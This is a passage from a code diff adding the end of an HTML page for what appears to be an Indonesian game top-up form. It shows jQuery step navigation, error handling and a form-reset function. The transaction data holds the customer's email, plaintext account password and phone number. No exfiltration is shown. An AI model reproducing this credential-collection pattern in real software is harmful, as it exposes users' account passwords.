+                    'Tidak ada bukti');
+                
+                // Sembunyikan loading, tampilkan success
+                $('#loadingOverlay').hide();
+                $('#successMessage').show();
+                
+                // Pindah ke step 5 setelah beberapa detik
+                setTimeout(() => {
+                    $('#successMessage').hide();
+                    changeStep(4, 5);
+                }, 3000);
+                
+            } catch (error) {
+                console.error('Transaction error:', error);
+                $('#loadingOverlay').hide();
+                showErrorAlert(error.message);
+                
+                // Kembali ke step 1 jika game tidak valid
+                if (error.message.includes('game')) {
+                    resetForm();
+                    changeStep(4, 1);
+                }
+            }
+        });
+
+        // Fungsi untuk reset form
+        function resetForm() {
+            // Reset UI
+            $('.game-option').removeClass('selected');
+            $('.package-card').removeClass('selected');
+            $('#imagePreview').hide();
+            $('#uploadArea').show();
+            $('#paymentProof').val('');
+            
+            // Reset form validation
+            const form = document.getElementById('accountForm');
+            form.classList.remove('was-validated');
+            form.reset();
+            
+            // Reset transaction data
+            transactionData = {
+                game: null,
+                package: null,
+                option: null,
+                item_name: 'Paket belum dipilih',
+                amount: 0,
+                status: 'pending',
+                payment_method: 'qris',
+                user_data: {
+                    email: '',
+                    password: '',
+                    phone: ''
+                },
+                payment_proof: null,
+                timestamp: null
+            };
+            
+            // Reset tampilan harga
+            $('#paymentAmount, #modalPaymentAmount').text('Rp 0');
+            
+            // Reset step indicator
+            $('.step-circle').removeClass('active completed');
+            $('#stepCircle1').addClass('active');
+            
+            // Reset buttons
+            $('#nextStep1').prop('disabled', true);
+            $('#nextStep2').prop('disabled', true);
+        }
+
+        // Inisialisasi
+        $(function () {
+            $('[data-bs-toggle="tooltip"]').tooltip();
+        });
+    </script>
+</body>
+</html>
